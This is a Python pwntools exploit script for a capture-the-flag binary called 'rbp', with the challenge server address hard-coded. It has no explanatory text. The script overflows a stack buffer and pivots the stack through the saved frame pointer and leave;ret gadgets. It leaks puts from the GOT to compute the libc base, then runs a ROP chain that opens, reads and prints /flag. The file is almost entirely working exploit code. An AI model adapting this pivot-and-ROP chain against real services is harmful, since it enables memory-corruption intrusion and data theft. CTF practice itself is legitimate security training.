from pwn import *
import sys
remote_addr = ["node5.anna.nssctf.cn", 28839]
libc = ELF('./libc.so.6')
elf = ELF('./rbp')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./rbp_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 0

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

debug()

vuln_read = 0x401292
pop_rdi = 0x401353
leave_ret = 0x40121d
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

payload = b'a' * (0x210) + p64(0x404310) + p64(vuln_read)
sa(b'it\n', payload)

payload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt)
payload = payload.ljust(0x210, b'a')
payload += p64(0x404530) + p64(vuln_read)
pause()
s(payload)


payload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(0x4012ee) + p64(0x404560) + p64(vuln_read)
payload = payload.ljust(0x210, b'a')
payload += p64(0x404318) + p64(leave_ret)
pause()
s(payload)

libc.address = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['puts']
pr('libc.address', libc.address)

open = libc.sym['open']
read = libc.sym['read']
write = libc.sym['write']
pop_rsi = libc.address + 0x2601f
pop_rdx = libc.address + 0x142c92

payload = p64(pop_rdi) + p64(0x4043e8) + p64(pop_rsi) + p64(0x0) + p64(open)
payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(0x404500) + p64(pop_rdx) + p64(0x30) + p64(read)
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(0x404500) + p64(pop_rdx) + p64(0x30) + p64(write)
payload += b'/flag\x00'
payload = payload.ljust(0x210, b'a')
payload += p64(0x404348) + p64(leave_ret)
pause()
s(payload)

shell()
